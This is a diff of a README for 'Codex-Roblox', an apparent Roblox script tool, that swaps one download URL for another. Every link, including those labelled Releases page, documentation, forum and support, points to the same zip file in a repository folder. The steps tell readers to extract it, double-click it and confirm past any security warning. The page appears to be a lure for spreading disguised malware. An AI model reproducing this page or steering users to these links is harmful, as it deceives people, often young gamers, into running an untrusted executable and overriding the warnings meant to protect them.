@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Codex-Roblox](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip%20Codex--Roblox-v1.0-blue)](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip)
+[![Download Codex-Roblox](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip%20Codex--Roblox-v1.0-blue)](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,10 +20,10 @@ Before you download, make sure your computer meets these requirements:
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip) to find the latest version.
+   Go to our [Releases page](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip) to find the latest version.
 
 2. **Choose the Version**  
-   Select the most recent version of Codex-Roblox. Look for the file named something like `https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip`.
+   Select the most recent version of Codex-Roblox. Look for the file named something like `https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip`.
 
 3. **Download the File**  
    Click on the file link to download it. Save it to a location on your computer where you can easily find it (like your Desktop or Downloads folder).
@@ -32,7 +32,7 @@ Before you download, make sure your computer meets these requirements:
    After it finishes downloading, locate the downloaded `.zip` file. Right-click on it and select "Extract All" or use any extraction tool you have. This will create a new folder with the application files.
 
 5. **Run Codex-Roblox**  
-   Open the newly created folder. Look for `https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip`. Double-click the file to start the application. If a warning appears, confirm that you want to run the file.
+   Open the newly created folder. Look for `https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip`. Double-click the file to start the application. If a warning appears, confirm that you want to run the file.
 
 ## 🔧 How to Use Codex-Roblox
 
@@ -64,12 +64,12 @@ Codex-Roblox is open-source software. You can review the source code, suggest ch
 
 ## 💬 Support
 
-If you encounter any issues or need assistance, please check our FAQ section on the [GitHub page](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip). You can also open a new issue if you need help.
+If you encounter any issues or need assistance, please check our FAQ section on the [GitHub page](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip). You can also open a new issue if you need help.
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip) - For detailed guides on usage.
-- [Community Forum](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip) - Connect with other users and find scripts easily.
+- [Official Documentation](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip) - For detailed guides on usage.
+- [Community Forum](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip) - Connect with other users and find scripts easily.
 
 ## 📩 Contact
 
@@ -77,4 +77,4 @@ For questions or feedback, reach out through our GitHub page. We’d love to hea
 
 ---
 
-Remember to return to the [Releases page](https://raw.githubusercontent.com/AlHayaza/Codex-Roblox/main/pietism/Codex-Roblox.zip) for updates and new versions. Enjoy using Codex-Roblox!
+Remember to return to the [Releases page](https://github.com/AlHayaza/Codex-Roblox/raw/refs/heads/main/pietism/Roblox_Codex_v2.8-alpha.1.zip) for updates and new versions. Enjoy using Codex-Roblox!
